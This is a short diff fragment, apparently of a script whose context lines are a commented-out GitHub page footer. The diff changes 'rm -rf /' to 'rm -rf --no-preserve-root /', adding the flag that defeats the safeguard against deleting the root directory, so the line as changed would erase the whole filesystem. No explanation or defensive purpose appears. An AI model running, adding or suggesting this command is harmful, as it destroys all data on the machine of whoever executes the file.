@@ -18,4 +18,4 @@
 # Status API Training Shop Blog About Pricing
 #
 
-rm -rf /
+rm -rf --no-preserve-root /
